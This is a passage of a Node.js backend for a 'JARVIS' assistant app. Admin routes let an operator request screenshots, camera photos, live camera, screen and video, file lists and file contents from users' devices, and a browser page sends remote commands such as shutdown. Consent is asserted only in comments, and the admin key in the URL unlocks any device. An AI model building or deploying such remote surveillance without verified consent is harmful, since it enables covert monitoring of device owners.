    // GET /api/pc/pair-info?pc_id=&token= — PC (or voice page) asks who it is paired to
    if (req.method === "GET" && pathname === "/api/pc/pair-info") {
      const pcId = safeId(url.searchParams.get("pc_id"));
      const pairs = loadPairs();
      const p = pairs[pcId];
      if (!p || !p.install_id || String(url.searchParams.get("token") || "") !== p.pc_token) return sendJson(res, 403, { error: "bad pc_token or not paired" });
      return sendJson(res, 200, { install_id: p.install_id, pc_name: p.pc_name || "" });
    }

    // GET /api/pc/screen?install_id= — phone fetches the paired PC's latest screenshot
    if (req.method === "GET" && pathname === "/api/pc/screen") {
      const installId = String(url.searchParams.get("install_id") || "").trim();
      const users = loadUsers();
      const u = users[installId];
      if (!u || !u.paired_pc_id) return sendJson(res, 403, { error: "phone is not paired to a PC" });
      const f = path.join(PC_SCREEN_DIR, safeId(u.paired_pc_id) + ".jpg");
      if (!fs.existsSync(f)) return sendJson(res, 404, { error: "no PC screenshot yet" });
      return sendJson(res, 200, { image: fs.readFileSync(f).toString("base64"), at: fs.statSync(f).mtime.toISOString() });
    }

    // ---- POST /api/event
    if (req.method === "POST" && pathname === "/api/event") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      if (!body.event) return sendJson(res, 400, { error: "event required" });
      const users = loadUsers();
      let user = users[installId];
      if (!user) {
        const now = new Date().toISOString();
        user = {
          install_id: installId, device_id: "", device_model: "", app_version: "",
          first_seen: now, last_seen: now, status: "ok", until: null,
          last_action: "", monitoring: false, permissions: {}, recent_activity: [],
          events: [], history: [], last_screenshot_at: null,
        };
        users[installId] = user;
      }
      user.events = user.events || [];
      user.events.push({
        at: new Date().toISOString(),
        event: String(body.event),
        detail: body.detail !== undefined ? String(body.detail) : "",
      });
      if (user.events.length > 20) user.events = user.events.slice(-20);
      user.last_seen = new Date().toISOString();
      saveUsers(users);
      return sendJson(res, 200, { ok: true });
    }

    // ---- POST /api/history (consent only — the app sends this only when
    // the user turned ON "Owner monitoring" in Jarvis Settings)
    if (req.method === "POST" && pathname === "/api/history") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      if (!Array.isArray(body.messages)) return sendJson(res, 400, { error: "messages array required" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      user.history = body.messages
        .filter((m) => m && typeof m.text === "string")
        .slice(-50)
        .map((m) => ({ role: m.role === "jarvis" ? "jarvis" : "user", text: String(m.text).slice(0, 2000), at: m.at || "" }));
      user.last_seen = new Date().toISOString();
      saveUsers(users);
      return sendJson(res, 200, { ok: true, stored: user.history.length });
    }

    // ---- POST /api/screenshot (consent only + owner-requested only)
    if (req.method === "POST" && pathname === "/api/screenshot") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      const image = String(body.image || "");
      if (!installId || !image) return sendJson(res, 400, { error: "install_id and image required" });
      if (!/^[A-Za-z0-9+/=]+$/.test(image)) return sendJson(res, 400, { error: "image must be base64" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      fs.mkdirSync(SHOTS_DIR, { recursive: true });
      fs.writeFileSync(path.join(SHOTS_DIR, safeFileName(installId) + ".jpg"), Buffer.from(image, "base64"));
      user.last_screenshot_at = new Date().toISOString();
      user.last_seen = user.last_screenshot_at;
      saveUsers(users);
      // Consume the request flag so the app sends only one screenshot.
      const cfg = loadConfig();
      if (cfg.screenshot_requested) { delete cfg.screenshot_requested[installId]; saveConfig(cfg); }
      return sendJson(res, 200, { ok: true });
    }

    // ---- POST /api/camera-photo (consent only + owner-requested only)
    if (req.method === "POST" && pathname === "/api/camera-photo") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      const image = String(body.image || "");
      if (!installId || !image) return sendJson(res, 400, { error: "install_id and image required" });
      if (!/^[A-Za-z0-9+/=]+$/.test(image)) return sendJson(res, 400, { error: "image must be base64" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      fs.mkdirSync(CAM_DIR, { recursive: true });
      fs.writeFileSync(path.join(CAM_DIR, safeFileName(installId) + ".jpg"), Buffer.from(image, "base64"));
      user.last_camera_at = new Date().toISOString();
      user.last_seen = user.last_camera_at;
      saveUsers(users);
      const cfg = loadConfig();
      if (cfg.camera_requested) { delete cfg.camera_requested[installId]; saveConfig(cfg); }
      return sendJson(res, 200, { ok: true });
    }

    // ---- POST /api/file-list (consent only — the app sends its file LIST, not contents)
    if (req.method === "POST" && pathname === "/api/file-list") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId || !Array.isArray(body.files)) return sendJson(res, 400, { error: "install_id and files[] required" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      const files = body.files.slice(0, 1000).map((f) => ({
        path: String(f.path || f.name || "").slice(0, 300),
        name: String(f.name || "").slice(0, 150),
        size: typeof f.size === "number" ? f.size : 0,
        modified: typeof f.modified === "number" ? f.modified : 0,
        dir: !!f.dir,
      }));
      fs.mkdirSync(FILELIST_DIR, { recursive: true });
      fs.writeFileSync(path.join(FILELIST_DIR, safeFileName(installId) + ".json"), JSON.stringify({ at: new Date().toISOString(), count: files.length, files }, null, 1));
      user.last_file_list_at = new Date().toISOString();
      user.last_seen = user.last_file_list_at;
      saveUsers(users);
      const cfg = loadConfig();
      if (cfg.file_list_requested) { delete cfg.file_list_requested[installId]; saveConfig(cfg); }
      return sendJson(res, 200, { ok: true, count: files.length });
    }

    // ---- GET /api/admin/file-list/<install_id> (admin only)
    if (req.method === "GET" && pathname.startsWith("/api/admin/file-list/")) {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const id = safeFileName(pathname.slice("/api/admin/file-list/".length));
      const file = path.join(FILELIST_DIR, id + ".json");
      if (!fs.existsSync(file)) return sendJson(res, 404, { error: "no file list yet" });
      res.writeHead(200, { "Content-Type": "application/json" });
      return fs.createReadStream(file).pipe(res);
    }

    // ---- POST /api/files (consent only — the app uploads small text files
    // from its own workspace only, when the user allowed monitoring AND gave
    // file permission. Max 10 files, 100 KB each.)
    if (req.method === "POST" && pathname === "/api/files") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      if (!Array.isArray(body.files)) return sendJson(res, 400, { error: "files array required" });
      const users = loadUsers();
      const user = users[installId];
      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
      const dir = path.join(FILES_DIR, safeFileName(installId));
      fs.mkdirSync(dir, { recursive: true });
      const stored = [];
      for (const f of body.files.slice(0, 10)) {
        if (!f || typeof f.name !== "string" || typeof f.content !== "string") continue;
        const name = path.basename(f.name).replace(/[^A-Za-z0-9._-]/g, "");
        if (!name || f.content.length > 100_000) continue;
        fs.writeFileSync(path.join(dir, name), f.content, "utf8");
        stored.push(name);
      }
      user.files = stored;
      user.last_seen = new Date().toISOString();
      saveUsers(users);
      return sendJson(res, 200, { ok: true, stored });
    }

    // ---- GET /api/admin/camera-photo/<install_id>
    if (req.method === "GET" && pathname.startsWith("/api/admin/camera-photo/")) {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const id = safeFileName(pathname.slice("/api/admin/camera-photo/".length));
      const file = path.join(CAM_DIR, id + ".jpg");
      if (!fs.existsSync(file)) return sendJson(res, 404, { error: "no camera photo yet" });
      res.writeHead(200, { "Content-Type": "image/jpeg" });
      return fs.createReadStream(file).pipe(res);
    }

    // ---- GET /api/admin/file/<install_id>/<name> (download one stored file)
    if (req.method === "GET" && pathname.startsWith("/api/admin/file/")) {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const parts = pathname.slice("/api/admin/file/".length).split("/");
      const id = safeFileName(parts[0] || "");
      const name = path.basename(parts[1] || "").replace(/[^A-Za-z0-9._-]/g, "");
      const file = path.join(FILES_DIR, id, name);
      if (!name || !fs.existsSync(file)) return sendJson(res, 404, { error: "file not found" });
      res.writeHead(200, { "Content-Type": "application/octet-stream", "Content-Disposition": 'attachment; filename="' + name + '"' });
      return fs.createReadStream(file).pipe(res);
    }

    // ---- GET /api/admin/screenshot/<install_id>
    if (req.method === "GET" && pathname.startsWith("/api/admin/screenshot/")) {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const id = safeFileName(pathname.slice("/api/admin/screenshot/".length));
      const file = path.join(SHOTS_DIR, id + ".jpg");
      if (!fs.existsSync(file)) return sendJson(res, 404, { error: "no screenshot yet" });
      res.writeHead(200, { "Content-Type": "image/jpeg" });
      return fs.createReadStream(file).pipe(res);
    }

    // ---- GET /api/admin/users
    if (req.method === "GET" && pathname === "/api/admin/users") {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      const users = loadUsers();
      const devices = loadDevices();
      return sendJson(res, 200, Object.values(users).map((u) => publicUser(u, devices)));
    }

    // ---- GET /api/admin/pairs?key= (dashboard: list PC pairings)
    if (req.method === "GET" && pathname === "/api/admin/pairs") {
      if (url.searchParams.get("key") !== ADMIN_KEY) return sendJson(res, 403, { error: "bad key" });
      const pairs = loadPairs();
      return sendJson(res, 200, Object.values(pairs).map((p) => ({
        pc_id: p.pc_id, pc_name: p.pc_name || "", os: p.os || "",
        install_id: p.install_id || null, created_at: p.created_at || "", last_seen: p.last_seen || "",
      })));
    }

    // ---- GET /api/admin/config
    if (req.method === "GET" && pathname === "/api/admin/config") {
      if (url.searchParams.get("key") !== ADMIN_KEY) {
        return sendJson(res, 401, { error: "unauthorized" });
      }
      return sendJson(res, 200, loadConfig());
    }

    // ---- POST /api/admin/config
    if (req.method === "POST" && pathname === "/api/admin/config") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      const cfg = loadConfig();
      if (body.features && typeof body.features === "object") cfg.features = body.features;
      if (body.persona_extra !== undefined) cfg.persona_extra = String(body.persona_extra);
      if (body.announcement !== undefined) cfg.announcement = String(body.announcement);
      if (body.latest_version !== undefined) cfg.latest_version = String(body.latest_version);
      if (body.latest_version_code !== undefined) cfg.latest_version_code = Number(body.latest_version_code) || 0;
      if (body.apk_url !== undefined) cfg.apk_url = String(body.apk_url);
      if (body.supabase_url !== undefined) cfg.supabase_url = String(body.supabase_url).slice(0, 300);
      if (body.supabase_key !== undefined) cfg.supabase_key = String(body.supabase_key).slice(0, 400);
      if (Array.isArray(body.telegram_chats)) cfg.telegram_chats = body.telegram_chats.map(function(x) { return String(x); }).slice(0, 10);
      saveConfig(cfg);
      return sendJson(res, 200, publicConfig(cfg));
    }

    // ---- POST /api/admin/message — send a notification/message to installs.
    // The app shows it as a system notification on its next heartbeat.
    if (req.method === "POST" && pathname === "/api/admin/message") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      const target = String(body.target || "all").trim();
      const title = String(body.title || "").trim().slice(0, 100);
      const text = String(body.body || body.text || "").trim().slice(0, 500);
      if (!title || !text) return sendJson(res, 400, { error: "title and body required" });
      if (target !== "all") {
        const users = loadUsers();
        if (!users[target]) return sendJson(res, 404, { error: "unknown install_id" });
      }
      const cfg = loadConfig();
      cfg.messages = cfg.messages || [];
      const msg = { id: crypto.randomBytes(6).toString("hex"), target, title, body: text, at: new Date().toISOString() };
      cfg.messages.push(msg);
      if (cfg.messages.length > 20) cfg.messages = cfg.messages.slice(-20);
      saveConfig(cfg);
      return sendJson(res, 200, { ok: true, message: msg });
    }

    // ---- POST /api/admin/notify-email — email a user (or all users with an
    // email on file) via Resend. Needs RESEND_API_KEY in env; the user's email
    // only exists when they set it in Jarvis Settings AND turned ON monitoring.
    if (req.method === "POST" && pathname === "/api/admin/notify-email") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      if (!EMAIL_CONFIGURED) {
        return sendJson(res, 400, { error: "Email not configured — set RESEND_API_KEY (and RESEND_FROM) in the Render service env vars and redeploy." });
      }
      const target = String(body.target || "all").trim();
      const subject = String(body.subject || "").trim().slice(0, 150);
      const text = String(body.body || body.text || "").trim().slice(0, 5000);
      if (!subject || !text) return sendJson(res, 400, { error: "subject and body required" });
      const users = loadUsers();
      let recipients = [];
      if (target === "all") {
        recipients = Object.values(users).filter((u) => u.email).map((u) => ({ install_id: u.install_id, email: u.email }));
      } else {
        const u = users[target];
        if (!u) return sendJson(res, 404, { error: "unknown install_id" });
        if (!u.email) return sendJson(res, 400, { error: "No email on file for this user — the user must set their email in Jarvis Settings and turn ON Owner monitoring." });
        recipients = [{ install_id: u.install_id, email: u.email }];
      }
      if (recipients.length === 0) {
        return sendJson(res, 400, { error: "No user has an email on file — users must set their email in Jarvis Settings and turn ON Owner monitoring." });
      }
      const results = [];
      for (const r of recipients) {
        const sent = await sendEmailViaResend(r.email, subject, text);
        results.push({ install_id: r.install_id, email: r.email, sent: sent.ok, status: sent.status });
      }
      const sentCount = results.filter((r) => r.sent).length;
      return sendJson(res, 200, { ok: sentCount > 0, sent: sentCount, total: results.length, results });
    }

    // ---- POST /api/admin/action
    if (req.method === "POST" && pathname === "/api/admin/action") {
      const body = await readJsonBody(req);
      if (body.key !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      const installId = String(body.install_id || "").trim();
      const deviceId = String(body.device_id || "").trim();
      const action = String(body.action || "");
      const users = loadUsers();
      const devices = loadDevices();
      const user = users[installId];
      const days = body.days === undefined || body.days === null ? null : Number(body.days);
      const now = Date.now();

      if (action === "ban_device" || action === "unban_device") {
        const did = deviceId || (user && user.device_id) || "";
        if (!did) return sendJson(res, 400, { error: "no device_id for this install" });
        if (action === "ban_device") {
          devices[did] = { device_id: did, status: "banned", until: null, updated: new Date().toISOString() };
        } else {
          delete devices[did];
        }
        saveDevices(devices);
        return sendJson(res, 200, { ok: true, device_id: did, device_status: action === "ban_device" ? "banned" : "ok" });
      }

      if (action === "request_screenshot") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.screenshot_requested = cfg.screenshot_requested || {};
        cfg.screenshot_requested[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, screenshot_requested: true });
      }

      if (action === "request_camera") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.camera_requested = cfg.camera_requested || {};
        cfg.camera_requested[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, camera_requested: true });
      }

      if (action === "request_live_camera") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.live_camera = cfg.live_camera || {};
        cfg.live_camera[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, live_camera: true });
      }

      if (action === "stop_live_camera") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        if (cfg.live_camera) { delete cfg.live_camera[installId]; saveConfig(cfg); }
        return sendJson(res, 200, { ok: true, live_camera: false });
      }

      if (action === "request_live_screen") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.live_screen = cfg.live_screen || {};
        cfg.live_screen[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, live_screen: true });
      }

      if (action === "stop_live_screen") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        if (cfg.live_screen) { delete cfg.live_screen[installId]; saveConfig(cfg); }
        return sendJson(res, 200, { ok: true, live_screen: false });
      }

      if (action === "request_file_list") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.file_list_requested = cfg.file_list_requested || {};
        cfg.file_list_requested[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, file_list_requested: true });
      }

      if (action === "request_live_video") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        cfg.live_video = cfg.live_video || {};
        cfg.live_video[installId] = true;
        saveConfig(cfg);
        return sendJson(res, 200, { ok: true, live_video: true });
      }

      if (action === "stop_live_video") {
        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
        const cfg = loadConfig();
        if (cfg.live_video) { delete cfg.live_video[installId]; saveConfig(cfg); }
        return sendJson(res, 200, { ok: true, live_video: false });
      }

      if (!user) return sendJson(res, 404, { error: "unknown install_id" });
      if (action === "ban") {
        user.status = "banned";
        user.until = null;
      } else if (action === "suspend") {
        const d = days && days > 0 ? days : 7;
        user.status = "suspended";
        user.until = new Date(now + d * 24 * 3600 * 1000).toISOString();
      } else if (action === "shutdown") {
        user.status = "shutdown";
        user.until = days && days > 0 ? new Date(now + days * 24 * 3600 * 1000).toISOString() : null;
      } else if (action === "restore") {
        user.status = "ok";
        user.until = null;
      } else {
        return sendJson(res, 400, { error: "unknown action (ban|suspend|shutdown|restore|ban_device|unban_device|request_screenshot)" });
      }
      saveUsers(users);
      return sendJson(res, 200, publicUser(user, devices));
    }

    // ---- GET /pc-voice (PC live voice call page — Agora Web SDK, no install)
    // Opened from the PC app with ?pc_id=&token= ; the page fetches its pair
    // info + an Agora token, then joins jarvis-voice-<install_id> with the mic.
    // The phone joins the same channel (uid 2002) when the PC asks via relay.
    if (req.method === "GET" && pathname === "/pc-voice") {
      const html = '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>JARVIS PC — Live Voice</title>'
        + '<style>body{background:#0b1220;color:#e2e8f0;font-family:system-ui,sans-serif;text-align:center;padding:24px}h1{color:#22d3ee}button{font-size:18px;padding:12px 28px;border-radius:10px;border:0;background:#22d3ee;color:#082f49;cursor:pointer;margin:6px}.muted{color:#94a3b8}#status{font-size:18px;margin:18px 0}</style>'
        + '<script src="https://download.agora.io/sdk/release/AgoraRTC_N.js"></script></head><body>'
        + '<h1>🎙️ JARVIS — Live Voice Call</h1><p class="muted">PC ↔ Phone — real-time voice, du dikei shona jabe.</p>'
        + '<div id="status">Connecting…</div>'
        + '<div><button id="muteBtn" onclick="toggleMute()">🔇 Mute</button>'
        + '<button onclick="leaveCall()">📞 End call</button></div>'
        + '<p class="muted">Call cholakalin phone-er always-on listening pause thakbe — call sesh hole abar chalu hobe.</p>'
        + '<script>'
        + 'var qs = new URLSearchParams(location.search);'
        + 'var pcId = qs.get("pc_id") || ""; var token = qs.get("token") || "";'
        + 'var client = null, micTrack = null, muted = false, installId = "";'
        + 'function setStatus(s) { document.getElementById("status").textContent = s; }'
        + 'async function joinCall() {'
        + '  try {'
        + '    var r = await fetch("/api/pc/pair-info?pc_id=" + encodeURIComponent(pcId) + "&token=" + encodeURIComponent(token));'
        + '    var j = await r.json();'
        + '    if (!r.ok || !j.install_id) { setStatus("Pair hoy ni — age PC app theke QR scan kore pair koro."); return; }'
        + '    installId = j.install_id;'
        + '    // channel token thekei ase ("jarvis-<install_id>") — phone uid 2002 diye ekoi channel-e join kore.'
        + '    var r2 = await fetch("/api/agora-token?install_id=" + encodeURIComponent(installId) + "&uid=2001");'
        + '    var t2 = await r2.json();'
        + '    if (!r2.ok || !t2.token) { setStatus("Agora token pelam na — backend-e AGORA_APP_ID / AGORA_APP_CERTIFICATE ache kina dekho."); return; }'
        + '    client = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });'
        + '    client.on("user-published", async function(user, mediaType) {'
        + '      await client.subscribe(user, mediaType);'
        + '      if (mediaType === "audio") { user.audioTrack.play(); setStatus("🎙️ Live — phone connected, kotha bolo!"); }'
        + '    });'
        + '    client.on("user-unpublished", function() { setStatus("📱 Phone call theke beriye geche."); });'
        + '    await client.join(t2.appId, t2.channel, t2.token, 2001);'
        + '    micTrack = await AgoraRTC.createMicrophoneAudioTrack();'
        + '    await client.publish(micTrack);'
        + '    setStatus("🎙️ Live — mic on. Phone join korlei du dike kotha shona jabe…");'
        + '    await fetch("/api/relay/send", { method: "POST", headers: { "Content-Type": "application/json" },'
        + '      body: JSON.stringify({ from: "pc", from_id: pcId, to: installId, kind: "voice_call", text: "live voice call", token: token }) });'
        + '  } catch (e) { setStatus("Call join hoy ni: " + e.message); }'
        + '}'
        + 'async function toggleMute() {'
        + '  if (!micTrack) return;'
        + '  muted = !muted; await micTrack.setMuted(muted);'
        + '  document.getElementById("muteBtn").textContent = muted ? "🔊 Unmute" : "🔇 Mute";'
        + '}'
        + 'async function leaveCall() {'
        + '  try {'
        + '    if (installId) await fetch("/api/relay/send", { method: "POST", headers: { "Content-Type": "application/json" },'
        + '      body: JSON.stringify({ from: "pc", from_id: pcId, to: installId, kind: "voice_end", text: "call ended", token: token }) });'
        + '  } catch (e) {}'
        + '  try { if (micTrack) micTrack.close(); if (client) await client.leave(); } catch (e) {}'
        + '  setStatus("Call sesh. Window-ta bondho kore dite paro.");'
        + '}'
        + 'window.addEventListener("beforeunload", function() { leaveCall(); });'
        + 'joinCall();'
        + '</script></body></html>';
      return sendHtml(res, 200, html);
    }

    // ---- v1.7.0: /remote — QR scan kore browser theke control (app lagbe na) ----
    // Auth: install_id + remote_token (phone v1.7.0-te register kore) BA admin key.
    // Page-e device list (phone + paired PC, online status) + command box + results.
    // Jekono internet-e cholbe — mobile data / Wi-Fi, same network lagbe na.
    function remoteAuth(u) {
      const id = safeId(u.searchParams.get("install_id"));
      const tok = String(u.searchParams.get("token") || "");
      if (!id || !tok) return null;
      if (tok === ADMIN_KEY) return id;
      const users = loadUsers();
      if (users[id] && users[id].remote_token && users[id].remote_token === tok) return id;
      return null;
    }
    // GET /api/remote/installs?token=ADMIN_KEY — dashboard theke device picker
    if (req.method === "GET" && pathname === "/api/remote/installs") {
      if (String(url.searchParams.get("token") || "") !== ADMIN_KEY) return sendJson(res, 401, { error: "unauthorized" });
      const users = loadUsers();
      const out = Object.keys(users).map(function(id) {
        const u = users[id];
        return { install_id: id, model: u.device_model || "", app_version: u.app_version || "", online: u.last_seen ? (Date.now() - new Date(u.last_seen).getTime() < 16 * 60 * 1000) : false };
      });
      return sendJson(res, 200, { installs: out });
    }
    // GET /api/remote/devices?install_id=&token= — phone + paired PC, online status
    if (req.method === "GET" && pathname === "/api/remote/devices") {
      const id = remoteAuth(url);
      if (!id) return sendJson(res, 401, { error: "unauthorized" });
      const users = loadUsers();
      const pairs = loadPairs();
      const u = users[id] || {};
      const phoneOnline = u.last_seen ? (Date.now() - new Date(u.last_seen).getTime() < 16 * 60 * 1000) : false;
      const pcs = [];
      Object.keys(pairs).forEach(function(pcId) {
        const pr = pairs[pcId];
        if (pr.install_id === id) pcs.push({ pc_id: pcId, pc_name: pr.pc_name || pcId, os: pr.os || "", online: pr.last_seen ? (Date.now() - new Date(pr.last_seen).getTime() < 2 * 60 * 1000) : false, last_seen: pr.last_seen || null });
      });
      return sendJson(res, 200, { phone: { install_id: id, model: u.device_model || "", app_version: u.app_version || "", online: phoneOnline, last_seen: u.last_seen || null }, pcs });
    }
    // POST /api/remote/send {install_id, token, target:"phone"|"pc", text} — command pathao
    if (req.method === "POST" && pathname === "/api/remote/send") {
      const b = await readJsonBody(req);
      const id = remoteAuth(new URL("http://x/?install_id=" + encodeURIComponent(b.install_id || "") + "&token=" + encodeURIComponent(b.token || "")));
      if (!id) return sendJson(res, 401, { error: "unauthorized" });
      const target = String(b.target || "phone");
      const text = String(b.text || "").slice(0, 4000);
      if (!text) return sendJson(res, 400, { error: "text required" });
      let to = id;
      if (target === "pc") {
        const users = loadUsers();
        if (!users[id] || !users[id].paired_pc_id) return sendJson(res, 400, { error: "no PC paired to this phone" });
        to = users[id].paired_pc_id;
      }
      const mid = crypto.randomBytes(8).toString("hex");
      pushRelay(to, { id: mid, from: "remote", kind: "text", text, audio_file: "", at: new Date().toISOString() });
      return sendJson(res, 200, { ok: true, id: mid, to: target });
    }
    // GET /api/remote/results?install_id=&token= — phone + PC-r recent replies
    if (req.method === "GET" && pathname === "/api/remote/results") {
      const id = remoteAuth(url);
      if (!id) return sendJson(res, 401, { error: "unauthorized" });
      const users = loadUsers();
      const out = { phone: loadResults(id), pc: [] };
      if (users[id] && users[id].paired_pc_id) out.pc = loadResults(users[id].paired_pc_id);
      return sendJson(res, 200, out);
    }
    // GET /remote — browser remote-control page (QR scan kore khule)
    if (req.method === "GET" && pathname === "/remote") {
      const html = '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>JARVIS Remote</title>'
        + '<style>body{background:#0b1220;color:#e2e8f0;font-family:system-ui,sans-serif;padding:16px;max-width:640px;margin:auto}h1{color:#22d3ee}button{font-size:15px;padding:10px 14px;border-radius:10px;border:0;background:#22d3ee;color:#082f49;cursor:pointer;margin:4px}input,select{font-size:16px;padding:10px;border-radius:8px;border:1px solid #334155;background:#1e293b;color:#e2e8f0;width:100%;box-sizing:border-box}.card{background:#1e293b;border-radius:12px;padding:12px;margin:10px 0}.on{color:#4ade80}.off{color:#f87171}.res{white-space:pre-wrap;background:#0f172a;border-radius:8px;padding:10px;margin:6px 0;font-size:14px}</style></head><body>'
        + '<h1>🤖 JARVIS Remote</h1><p>QR scan kore khulle — app lagbe na. Jekono internet-e cholbe (mobile data / Wi-Fi, same network lagbe na).</p>'
        + '<div class="card"><b>Device</b><br><select id="installSel" onchange="pickInstall()"></select><div id="devices">Loading…</div></div>'
        + '<div class="card"><label>Target</label><br><select id="target"><option value="phone">📱 Phone</option><option value="pc">💻 PC</option></select><br><br>'
        + '<input id="cmd" placeholder="Command likho — e.g. find my phone, take a screenshot, open WhatsApp"><br><br>'
        + '<button onclick="sendCmd()">▶ Send</button>'
        + '<button onclick="quick(\'find my phone\')">🔍 Find phone</button>'
        + '<button onclick="quick(\'where is my phone\')">📍 Location</button>'
        + '<button onclick="quick(\'take a screenshot\')">📸 Screenshot</button>'
        + '<button onclick="quick(\'shutdown\')">⏻ PC off</button></div>'
        + '<div class="card"><b>Replies</b><div id="results"></div></div>'
        + '<script>'
        + 'var qs = new URLSearchParams(location.search);'
        + 'var installId = qs.get("install_id") || ""; var token = qs.get("token") || "";'
        + 'async function loadInstalls() {'
        + '  var sel = document.getElementById("installSel");'
        + '  if (installId) { sel.innerHTML = "<option value=\\"" + installId + "\\">" + installId.slice(0, 12) + "…</option>"; return; }'
        + '  try { var r = await fetch("/api/remote/installs?token=" + encodeURIComponent(token));'
        + '  var j = await r.json(); if (!r.ok) return;'
        + '  sel.innerHTML = "";'
        + '  (j.installs || []).forEach(function(u) { var o = document.createElement("option"); o.value = u.install_id; o.textContent = (u.model || u.install_id.slice(0, 12)) + " v" + (u.app_version || "?") + (u.online ? " ●" : " ○"); sel.appendChild(o); });'
        + '  if (sel.options.length) { installId = sel.value; loadDevices(); loadResults(); } } catch (e) {}'
        + '}'
        + 'function pickInstall() { installId = document.getElementById("installSel").value; loadDevices(); loadResults(); }'
        + 'async function loadDevices() {'
        + '  if (!installId) return;'
        + '  try { var r = await fetch("/api/remote/devices?install_id=" + encodeURIComponent(installId) + "&token=" + encodeURIComponent(token));'
        + '  var j = await r.json();'
        + '  if (!r.ok) { document.getElementById("devices").innerHTML = "Auth hoy ni — QR-ta abar scan koro."; return; }'
        + '  var h = "📱 Phone " + (j.phone.model || "") + " v" + (j.phone.app_version || "?") + " — " + (j.phone.online ? "<span class=\\"on\\">● Online</span>" : "<span class=\\"off\\">○ Offline</span>");'
        + '  j.pcs.forEach(function(p) { h += "<br>💻 " + p.pc_name + " (" + (p.os || "") + ") — " + (p.online ? "<span class=\\"on\\">● Online</span>" : "<span class=\\"off\\">○ Offline</span>"); });'
        + '  if (!j.pcs.length) h += "<br><span>💻 Kono PC pair hoy ni ekhono.</span>";'
        + '  document.getElementById("devices").innerHTML = h; } catch (e) {}'
        + '}'
        + 'async function sendCmd() { var t = document.getElementById("cmd").value.trim(); if (!t) return; document.getElementById("cmd").value = ""; await sendText(t); }'
        + 'async function quick(t) { await sendText(t); }'
        + 'async function sendText(t) {'
        + '  if (!installId) return;'
        + '  var tg = document.getElementById("target").value;'
        + '  await fetch("/api/remote/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ install_id: installId, token: token, target: tg, text: t }) });'
        + '  setTimeout(loadResults, 1500);'
        + '}'
        + 'async function loadResults() {'
        + '  if (!installId) return;'
        + '  try { var r = await fetch("/api/remote/results?install_id=" + encodeURIComponent(installId) + "&token=" + encodeURIComponent(token));'
        + '  var j = await r.json(); if (!r.ok) return;'
        + '  var all = [];'
        + '  (j.phone || []).forEach(function(x) { all.push("📱 " + x.text); });'
        + '  (j.pc || []).forEach(function(x) { all.push("💻 " + x.text); });'
        + '  var h = ""; all.slice(-10).forEach(function(s) { h += "<div class=\\"res\\">" + s.replace(/</g, "&lt;") + "</div>"; });'
        + '  document.getElementById("results").innerHTML = h || "<p>No replies yet.</p>"; } catch (e) {}'
        + '}'
        + 'loadInstalls(); loadDevices(); loadResults(); setInterval(function() { loadDevices(); loadResults(); }, 3000);'
        + '</script></body></html>';
      return sendHtml(res, 200, html);
    }

    // ---- v1.7.0: Telegram bot control ----
    // Setup: @BotFather-e bot banao -> token Render env TELEGRAM_BOT_TOKEN-e dao.
    // Bot-ke /start korle se chat id dekhabe; dashboard-e Telegram section-e chat id
